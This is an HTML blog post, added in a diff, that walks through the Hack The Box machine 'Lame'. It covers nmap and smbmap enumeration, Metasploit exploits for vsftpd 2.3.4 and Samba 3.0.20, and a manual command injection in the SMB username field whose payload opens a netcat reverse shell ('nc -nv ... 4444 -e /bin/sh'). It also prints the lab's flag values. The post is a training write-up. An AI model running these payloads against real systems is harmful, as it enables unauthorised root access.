@@ -1,0 +1,450 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Lame Writeup / Walkthrough Hack the box</title>
+
+  <link rel="icon" type="image/png" href="/assets/images/logo.png?v=96ad5fd1fb">
+  <link rel="apple-touch-icon" href="/assets/images/logo.png?v=96ad5fd1fb">
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Space+Grotesk:wght@400;500;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <link rel="stylesheet" href="/assets/css/style.css?v=96ad5fd1fb">
+
+  <meta name="description" content="This writeup is based on Lame on Hack the box. It was a Linux box. Using samba username map script vulnerability, we gain user and root.">
+    <link rel="canonical" href="https://sheerazali.com/blog/lame-writeup-walkthrough-hack-the-box/">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    
+    <meta property="og:site_name" content="Sheeraz Ali">
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="Lame Writeup / Walkthrough Hack the box">
+    <meta property="og:description" content="This writeup is based on Lame on Hack the box. It was a Linux box. Using samba username map script vulnerability, we gain user and root.">
+    <meta property="og:url" content="https://sheerazali.com/blog/lame-writeup-walkthrough-hack-the-box/">
+    <meta property="og:image" content="https://i0.wp.com/sheerazali.com/wp-content/uploads/2021/05/Copy-of-BLOG-THUMBNAILS-2.png?fit&#x3D;1920%2C1080&amp;ssl&#x3D;1">
+    <meta property="article:published_time" content="2021-05-15T10:35:10.000Z">
+    <meta property="article:modified_time" content="2021-05-15T10:36:13.000Z">
+    <meta property="article:tag" content="HackTheBox">
+    <meta property="article:tag" content="Writeup">
+    
+    <meta property="article:publisher" content="https://www.facebook.com/ghost">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Lame Writeup / Walkthrough Hack the box">
+    <meta name="twitter:description" content="This writeup is based on Lame on Hack the box. It was a Linux box. Using samba username map script vulnerability, we gain user and root.">
+    <meta name="twitter:url" content="https://sheerazali.com/blog/lame-writeup-walkthrough-hack-the-box/">
+    <meta name="twitter:image" content="https://i0.wp.com/sheerazali.com/wp-content/uploads/2021/05/Copy-of-BLOG-THUMBNAILS-2.png?fit&#x3D;1920%2C1080&amp;ssl&#x3D;1">
+    <meta name="twitter:label1" content="Written by">
+    <meta name="twitter:data1" content="sheeraz ali">
+    <meta name="twitter:label2" content="Filed under">
+    <meta name="twitter:data2" content="HackTheBox, Writeup">
+    <meta name="twitter:site" content="@beingsheerazali">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="675">
+    
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "Sheeraz Ali",
+        "url": "https://sheerazali.com/",
+        "logo": {
+            "@type": "ImageObject",
+            "url": "https://sheerazali.com/favicon.ico"
+        }
+    },
+    "author": {
+        "@type": "Person",
+        "name": "sheeraz ali",
+        "image": {
+            "@type": "ImageObject",
+            "url": "https://www.gravatar.com/avatar/b78e4b3b7f8de6d5dafee8306d76ace7?s=250&r=x&d=mp",
+            "width": 250,
+            "height": 250
+        },
+        "url": "https://sheerazali.com/author/sheeraz/",
+        "sameAs": []
+    },
+    "headline": "Lame Writeup / Walkthrough Hack the box",
+    "url": "https://sheerazali.com/blog/lame-writeup-walkthrough-hack-the-box/",
+    "datePublished": "2021-05-15T10:35:10.000Z",
+    "dateModified": "2021-05-15T10:36:13.000Z",
+    "image": {
+        "@type": "ImageObject",
+        "url": "https://i0.wp.com/sheerazali.com/wp-content/uploads/2021/05/Copy-of-BLOG-THUMBNAILS-2.png?fit=1920%2C1080&ssl=1",
+        "width": 1200,
+        "height": 675
+    },
+    "keywords": "HackTheBox, Writeup",
+    "description": "This writeup is based on Lame on Hack the box. It was a Linux box. Using samba username map script vulnerability, we gain user and root.",
+    "mainEntityOfPage": "https://sheerazali.com/blog/lame-writeup-walkthrough-hack-the-box/"
+}
+    </script>
+
+    <meta name="generator" content="Ghost 5.130">
+    <link rel="alternate" type="application/rss+xml" title="Sheeraz Ali" href="https://sheerazali.com/rss/">
+    <script defer src="https://cdn.jsdelivr.net/ghost/portal@~2.51/umd/portal.min.js" data-i18n="true" data-ghost="https://sheerazali.com/" data-key="15f06e61ecb8d951198e7015b6" data-api="https://sheerazali.com/ghost/api/content/" data-locale="en" crossorigin="anonymous"></script><style id="gh-members-styles">.gh-post-upgrade-cta-content,
+.gh-post-upgrade-cta {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+    text-align: center;
+    width: 100%;
+    color: #ffffff;
+    font-size: 16px;
+}
+
+.gh-post-upgrade-cta-content {
+    border-radius: 8px;
+    padding: 40px 4vw;
+}
+
+.gh-post-upgrade-cta h2 {
+    color: #ffffff;
+    font-size: 28px;
+    letter-spacing: -0.2px;
+    margin: 0;
+    padding: 0;
+}
+
+.gh-post-upgrade-cta p {
+    margin: 20px 0 0;
+    padding: 0;
+}
+
+.gh-post-upgrade-cta small {
+    font-size: 16px;
+    letter-spacing: -0.2px;
+}
+
+.gh-post-upgrade-cta a {
+    color: #ffffff;
+    cursor: pointer;
+    font-weight: 500;
+    box-shadow: none;
+    text-decoration: underline;
+}
+
+.gh-post-upgrade-cta a:hover {
+    color: #ffffff;
+    opacity: 0.8;
+    box-shadow: none;
+    text-decoration: underline;
+}
+
+.gh-post-upgrade-cta a.gh-btn {
+    display: block;
+    background: #ffffff;
+    text-decoration: none;
+    margin: 28px 0 0;
+    padding: 8px 18px;
+    border-radius: 4px;
+    font-size: 16px;
+    font-weight: 600;
+}
+
+.gh-post-upgrade-cta a.gh-btn:hover {
+    opacity: 0.92;
+}</style>
+    <script defer src="https://cdn.jsdelivr.net/ghost/sodo-search@~1.8/umd/sodo-search.min.js" data-key="15f06e61ecb8d951198e7015b6" data-styles="https://cdn.jsdelivr.net/ghost/sodo-search@~1.8/umd/main.css" data-sodo-search="https://sheerazali.com/" data-locale="en" crossorigin="anonymous"></script>
+    
+    <link href="https://sheerazali.com/webmentions/receive/" rel="webmention">
+    <script defer src="/public/cards.min.js?v=96ad5fd1fb"></script>
+    <link rel="stylesheet" type="text/css" href="/public/cards.min.css?v=96ad5fd1fb">
+    <script defer src="/public/member-attribution.min.js?v=96ad5fd1fb"></script><style>:root {--ghost-accent-color: #FF1A75;}</style>
+</head>
+<body class="post-template tag-hackthebox tag-writeup tag-hash-import-2026-01-05-15-55">
+
+<div class="terminal-wrapper">
+
+  <header class="site-header">
+  <div class="container">
+    <div class="header-content">
+
+      <a href="https://sheerazali.com/" class="site-logo">
+        <img src="/assets/images/logo.png" alt="Sheeraz Ali">
+      </a>
+
+      <nav class="main-nav">
+        <ul>
+          <li><a href="https://sheerazali.com/" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>home<span class="bracket">]</span></a></li>
+          <li><a href="/blog/" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>blog<span class="bracket">]</span></a></li>
+          <li><a href="/timeline/" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>timeline<span class="bracket">]</span></a></li>
+          <li><a href="/resume/" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>resume<span class="bracket">]</span></a></li>
+          <li><a href="https://www.codevigilant.com/author/syed_sheeraz_ali/" target="_blank" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>cves<span class="bracket">]</span></a></li>
+          <li><a href="https://sheerazali.com/#contact" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>contact<span class="bracket">]</span></a></li>
+        </ul>
+      </nav>
+
+      <div class="header-status">
+        <span class="status-indicator">
+          <span class="status-dot"></span>
+          <span class="status-text">Online</span>
+        </span>
+      </div>
+
+    </div>
+  </div>
+</header>
+
+  <main class="main-content">
+    
+<article class="single-post">
+  <div class="container">
+
+    <header class="post-header">
+      <div class="post-meta-top">
+        <a href="https://sheerazali.com/tag/hackthebox/" class="post-category">HackTheBox</a>
+        <span class="post-date">May 15, 2021</span>
+        <span class="reading-time">7 min read</span>
+      </div>
+
+      <h1 class="post-title glitch" data-text="Lame Writeup / Walkthrough Hack the box">Lame Writeup / Walkthrough Hack the box</h1>
+
+      <div class="post-author">
+        <span class="author-label">Author:</span>
+        <a href="https://sheerazali.com/author/sheeraz/">sheeraz ali</a>
+      </div>
+    </header>
+
+    <div class="featured-image">
+      <img src="https://i0.wp.com/sheerazali.com/wp-content/uploads/2021/05/Copy-of-BLOG-THUMBNAILS-2.png?fit&#x3D;1920%2C1080&amp;ssl&#x3D;1" alt="Lame Writeup / Walkthrough Hack the box">
+    </div>
+
+    <div class="post-body">
+      <div class="content-wrapper">
+        <div class="terminal-window">
+          <div class="terminal-header">
+            <span class="terminal-dot red"></span>
+            <span class="terminal-dot yellow"></span>
+            <span class="terminal-dot green"></span>
+            <span class="terminal-title">Lame Writeup / Walkthrough Hack the box</span>
+          </div>
+          <div class="terminal-content">
+            <h2 id="lame-writeup-summary">Lame Writeup Summary</h2><figure class="kg-card kg-image-card"><img src="/assets/images/blog/2021_04_Lame_Cover.png" class="kg-image" alt loading="lazy" width="770" height="468"></figure><h2 id="tldr">TL;DR</h2><p>This writeup is based on <a href="//www.hackthebox.eu/home/machines/profile/1">Lame</a> on Hack the box. It was a Linux box. It starts with two major services, <strong>vsftpd, </strong>and <strong>Samba</strong>. We tried FTP logon but didn’t get anything interesting. Then try to exploit Samba service via command injection in the username field. Using samba service exploitation, we got a shell, then later using directory listing, we got the user flag and the root flag.</p><h2 id="walkthrough">Walkthrough</h2><h2 id="scanning-network">Scanning Network</h2><p>I started with a Nmap scan, I found ports 21, 22, 139, and 445 as FTP, SSH, NetBIOS-ssn, and Microsoft-ds respectively. I got FTP login allowed via anonymous user and Samba service. By Nmap’s banner grabbing, we got the Samba version that is 3.0.20. Let’s see the Nmap result.</p><pre><code class="language-bash"> Command - nmap -sV -A &lt;ip address&gt;
+ Nmap scan report for 10.129.127.33
+ Host is up (0.57s latency).
+ Not shown: 996 filtered ports
+ PORT    STATE SERVICE     VERSION
+ 21/tcp  open  ftp         vsftpd 2.3.4
+ |_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+ | ftp-syst: 
+ |   STAT: 
+ | FTP server status:
+ |      Connected to 10.10.14.23
+ |      Logged in as ftp
+ |      TYPE: ASCII
+ |      No session bandwidth limit
+ |      Session timeout in seconds is 300
+ |      Control connection is plain text
+ |      Data connections will be plain text
+ |      vsFTPd 2.3.4 - secure, fast, stable
+ |_End of status
+ 22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+ | ssh-hostkey: 
+ |   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
+ |_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
+ 139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+ 445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
+ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+ Host script results:
+ |_clock-skew: mean: 2h00m26s, deviation: 2h49m43s, median: 25s
+ | smb-os-discovery: 
+ |   OS: Unix (Samba 3.0.20-Debian)
+ |   Computer name: lame
+ |   NetBIOS computer name: 
+ |   Domain name: hackthebox.gr
+ |   FQDN: lame.hackthebox.gr
+ |_  System time: 2021-04-01T06:39:27-04:00
+ | smb-security-mode: 
+ |   account_used: 
+ |   authentication_level: user
+ |   challenge_response: supported
+ |_  message_signing: disabled (dangerous, but default)
+ |_smb2-time: Protocol negotiation failed (SMB2)</code></pre><p>In Nmap scan, we get the versions of both services, vsftpd 2.3.4 and Samba 3.0.20 and also we get the login information of the FTP. As per the version of both services, it looks like we have exploits available for both. With this information of both services now moves towards to next phase.</p><h2 id="enumeration">Enumeration</h2><p>In the enumeration phase, we will first enumerate the FTP via anonymous user.</p><pre><code class="language-bash"> Command - ftp 10.129.127.33
+ Connected to 10.129.127.33.
+ 220 (vsFTPd 2.3.4)
+ Name (&lt;ip address&gt;:root): anonymous
+ 331 Please specify the password.
+ Password:
+ 230 Login successful.
+ Remote system type is UNIX.
+ Using binary mode to transfer files.
+ ftp&gt; ls
+ 200 PORT command successful. Consider using PASV.
+ 150 Here comes the directory listing.
+ 226 Directory send OK.
+ ftp&gt; ls -al
+ 200 PORT command successful. Consider using PASV.
+ 150 Here comes the directory listing.
+ drwxr-xr-x    2 0        65534        4096 Mar 17  2010 .
+ drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..
+ 226 Directory send OK.
+ ftp&gt; pwd 
+ 257 "/"
+ ftp&gt; </code></pre><p>As we enumerated FTP, we didn’t anything interesting, but we know that FTP is vulnerable so we can try to exploit it in the exploitation phase. Now, let’s move to Samba service.</p><p>Here, we can enumerate Samba using <a href="//tools.kali.org/information-gathering/smbmap">smbmap</a> to get more information about the machine.</p><pre><code class="language-bash">Command - smbmap -H 10.129.127.33
+[+] IP: 10.129.127.33:445       Name: 10.129.127.33 
+Disk                                                    Permissions     Comment
+----                                                    -----------     -------
+print$                                                  NO ACCESS       Printer Drivers
+tmp                                                     READ, WRITE     oh noes!
+opt                                                     NO ACCESS
+IPC$                                                    NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
+ADMIN$                                                  NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))</code></pre><p>We get to know that the samba service provides read and write access to tmp directory. Now, we can do a recursive scan to identify more information about it.</p><pre><code class="language-bash">Command - smbmap -H 10.129.127.33 -R
+[+] IP: 10.129.127.33:445       Name: 10.129.127.33 
+Disk                                                    Permissions     Comment
+----                                                    -----------     -------
+print$                                                  NO ACCESS       Printer Drivers
+tmp                                                     READ, WRITE     oh noes!
+.\tmp*
+dr--r--r--                0 Thu Apr  1 07:09:11 2021    .
+dw--w--w--                0 Sat Oct 31 02:33:57 2020    ..
+dr--r--r--                0 Thu Apr  1 06:33:10 2021    .ICE-unix
+dw--w--w--                0 Thu Apr  1 06:33:33 2021    vmware-root
+dr--r--r--                0 Thu Apr  1 06:33:35 2021    .X11-unix
+fw--w--w--               11 Thu Apr  1 06:33:35 2021    .X0-lock
+fw--w--w--                0 Thu Apr  1 06:34:22 2021    5581.jsvc_up
+fw--w--w--             1600 Thu Apr  1 06:33:08 2021    vgauthsvclog.txt.0
+.\tmp.X11-unix*
+dr--r--r--                0 Thu Apr  1 06:33:35 2021    .
+dr--r--r--                0 Thu Apr  1 07:09:11 2021    ..
+fr--r--r--                0 Thu Apr  1 06:33:35 2021    X0
+opt                                                     NO ACCESS
+IPC$                                                    NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
+ADMIN$                                                  NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))</code></pre><p>By doing a recursive scan, we get to know what content is stored in the tmp directory. Now,  we will first move toward the FTP exploitation and try to exploit it.</p><h2 id="lame-writeup-exploitation">Lame writeup Exploitation</h2><h3 id="ftp-exploitation">FTP Exploitation</h3><p>Here, we can use <a href="//www.exploit-db.com/searchsploit">searchsploit</a> to find the exploit.</p><pre><code class="language-bash">msf6 &gt; search vsftpd 2.3.4
+ Matching Modules
+ #  Name                                  Disclosure Date  Rank       Check  Description
+ ----                                  ---------------  ----       -----  -----------
+ 0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution </code></pre><p>As we get vsftpd 2.3.4 – Backdoor Command Execution (Metasploit). Let’s exploit it using <a href="//www.metasploit.com/">Metasploit</a>.</p><pre><code class="language-bash"> msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; set RHOSTS 10.129.127.33
+ RHOSTS =&gt; &lt;ip address&gt;
+ msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; set LHOST tun0
+ LHOST =&gt; tun0
+ msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; exploit
+ [*] 10.129.127.200:21 - Banner: 220 (vsFTPd 2.3.4) 
+ [*] 10.129.127.200:21 - USER: 331 Please specify the password.
+ [*] Exploit completed, but no session was created.</code></pre><p>As you are able to see above, we provided the machine IP address as an RHOSTS(Remote Host Computer) and our local IP address(tun0) as an LHOST(Local Host Computer or tun0). So, we can exploit the FTP using a backdoor but we didn’t get a shell. So, now let’s move to smb exploitation manually as well as using the<a href="//www.metasploit.com/"> Metasploit</a>.</p><h3 id="samba-exploitation-using-metasploit">Samba Exploitation (Using Metasploit)</h3><p>We can search samba with version on metasploit and find a suitable exploit for it.</p><pre><code class="language-bash">msf6 &gt; searchsploit Samba 3.0
+Matching Modules
+================
+
+   #  Name                                       Disclosure Date  Rank       Check  Description
+   -  ----                                       ---------------  ----       -----  -----------
+   0  exploit/linux/samba/chain_reply            2010-06-16       good       No     Samba chain_reply Memory Corruption (Linux x86)
+   1  exploit/linux/samba/lsa_transnames_heap    2007-05-14       good       Yes    Samba lsa_io_trans_names Heap Overflow
+   2  exploit/multi/samba/usermap_script         2007-05-14       excellent  No     Samba "username map script" Command Execution
+   3  exploit/osx/samba/lsa_transnames_heap      2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow
+   4  exploit/solaris/samba/lsa_transnames_heap  2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow</code></pre><p>I will use exploit/multi/samba/usermap_script to exploit the service (use 2).</p><pre><code class="language-bash">msf6 exploit(multi/samba/usermap_script) &gt; set RHOSTS &lt;machine ip address&gt;
+ RHOSTS =&gt; 10.129.84.98
+ msf6 exploit(multi/samba/usermap_script) &gt; set LHOST tun0
+ LHOST =&gt; tun0
+ msf6 exploit(multi/samba/usermap_script) &gt; exploit
+
+ whoami
+ root
+ python -c 'import pty;pty.spawn("/bin/bash")'                      
+ root@lame:/# </code></pre><p>I already discuss the use of RHOSTS and LHOST in the FTP exploitation section.</p><h3 id="samba-exploitation-manual">Samba Exploitation (Manual)</h3><h4 id="command-injection">Command Injection</h4><p>We can try to login into tmp folder in the samba service using <a href="//www.samba.org/samba/docs/current/man-html/smbclient.1.html">smbclient</a>. We got an error in connection because this machine is of the older version, so we can provide that same version using options.</p><pre><code class="language-bash">Command - smbclient -N //&lt;ip address&gt;/tmp
+protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED
+Command - smbclient -N //&lt;ip address&gt;/tmp --option='client min protocol=NT1'</code></pre><p>After providing same version of Samba, we get the write access in tmp directory. Now we can try to do command injection in the username field by using payload and on another terminal, we have to open the Netcat to listen on a port.</p><p>We know that vulnerability has been exploited using command injection in the username. The payload includes nohup(which is used to end the shell after a long time) and we put the listener command (nc) along with our local IP address and port, and then /bin/sh, which provides a shell on the system. we can also use /bin/bash as its another common shell present on linux.</p><pre><code class="language-bash">Payload for username - logon "/=nohup nc -nv 10.10.14.3 4444 -e /bin/sh"</code></pre><pre><code class="language-bash"> smbclient -N //&lt;ip address&gt;/tmp --option='client min protocol=NT1'                                                                                   
+ Anonymous login successful
+ Try "help" to get a list of possible commands.
+ smb: &gt; logon "/=nohup nc -nv &lt;receiver IP address&gt; 4444 -e /bin/sh"
+ Password: 
+ session setup failed: NT_STATUS_IO_TIMEOUT
+ smb: &gt; </code></pre><p>Now, we have to open listener using Netcat on another terminal to get back the system shell of the machine.</p><pre><code class="language-bash"> Command - nc -lvnp 4444     
+ listening on [any] 4444 …
+ connect to [&lt;receiver ip address] from (UNKNOWN) [&lt;machine ip address&gt;] 35739
+ whoami
+ root
+ python -c 'import pty; pty.spawn("/bin/bash")'
+ root@lame:/#</code></pre><p>As mentioned above, I used python -c ‘import pty; pty.spawn(“/bin/bash”)’, to get a interactive shell.</p><h2 id="lame-writeup-user">Lame writeup: User</h2><p>There is no privilege escalation involved, you have to just change the directory and see the flag.</p><pre><code class="language-bash">root@lame:/# cd /home/makis
+root@lame:/home/makis# ls
+user.txt
+root@lame:/home/makis# cat user.txt
+9904cabe72575c40d503ba1892b0aaa6
+root@lame:/home/makis#</code></pre><h2 id="lame-writeup-root">Lame writeup: Root</h2><p>You get the root flag by changing and listing directories.</p><pre><code class="language-bash">root@lame:/# cd root
+root@lame:/root# ls
+Desktop  reset_logs.sh  root.txt  vnc.log
+root@lame:/root# cat root.txt
+c597adbb8f25db12c62dff3e645217cd
+root@lame:/root#</code></pre><p>If you liked this write-up then please leave a comment below about the explanation. Check out our recent write-ups <a href="https://sheerazali.com/redcross-writeup-walkthrough-hack-the-box/">Redcross</a> and <a href="https://sheerazali.com/enterprise-writeup-walkthrough-hack-the-box/">Enterprise</a>.</p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="post-tags">
+      <span class="tags-label">Tags:</span>
+      <a href="/tag/hackthebox/" class="tag">HackTheBox</a>
+      <a href="/tag/writeup/" class="tag">Writeup</a>
+    </div>
+
+  </div>
+</article>
+
+  <section class="related-posts">
+    <div class="container">
+      <h3 class="section-title"><span class="prefix">./</span>related_writeups</h3>
+      <div class="related-grid">
+        <a href="/blog/raining-cves-on-wordpress-plugins-using-semgrep-slide-deck/" class="related-card">
+          <div class="card-corner tl"></div>
+          <div class="card-corner tr"></div>
+          <div class="card-corner bl"></div>
+          <div class="card-corner br"></div>
+          <h4>Raining CVE&#x27;s on wordpress plugins using Semgrep Slide Deck</h4>
+          <span class="date">Sep 10, 2022</span>
+        </a>
+        <a href="/blog/shibboleth-writeup-walkthrough-hack-the-box/" class="related-card">
+          <div class="card-corner tl"></div>
+          <div class="card-corner tr"></div>
+          <div class="card-corner bl"></div>
+          <div class="card-corner br"></div>
+          <h4>Shibboleth Writeup / Walkthrough Hack the box</h4>
+          <span class="date">Feb 10, 2022</span>
+        </a>
+        <a href="/blog/horizontall-writeup-walkthrough-hack-the-box/" class="related-card">
+          <div class="card-corner tl"></div>
+          <div class="card-corner tr"></div>
+          <div class="card-corner bl"></div>
+          <div class="card-corner br"></div>
+          <h4>Horizontall Writeup / Walkthrough Hack the box</h4>
+          <span class="date">Feb 05, 2022</span>
+        </a>
+      </div>
+    </div>
+  </section>
+
+  </main>
+
+  <footer class="site-footer">
+  <div class="container">
+    <div class="footer-content">
+      <div class="footer-brand">
+        <span class="terminal-prefix">&gt;</span>
+        <span class="brand-text">sheeraz_ali</span>
+        <span class="cursor">_</span>
+      </div>
+      <div class="footer-links">
+        <a href="https://www.linkedin.com/in/sheeraz-ali-979943177/" target="_blank" title="LinkedIn"><i class="fab fa-linkedin"></i></a>
+        <a href="https://www.youtube.com/@sheerazali" target="_blank" title="YouTube"><i class="fab fa-youtube"></i></a>
+        <a href="https://twitter.com/BeingSheerazAli" target="_blank" title="Twitter/X"><i class="fab fa-twitter"></i></a>
+        <a href="https://github.com/pwnmeow" target="_blank" title="GitHub"><i class="fab fa-github"></i></a>
+      </div>
+      <div class="footer-copy">
+        <span class="cmd-prompt">$</span>
+        <span class="cmd-text">echo</span>
+        <span class="cmd-string">"&copy; 2026 Sheeraz Ali. All rights reserved."</span>
+      </div>
+    </div>
+  </div>
+</footer>
+
+</div>
+
+<script src="/assets/js/main.js?v=96ad5fd1fb"></script>
+
+
+</body>
+</html>
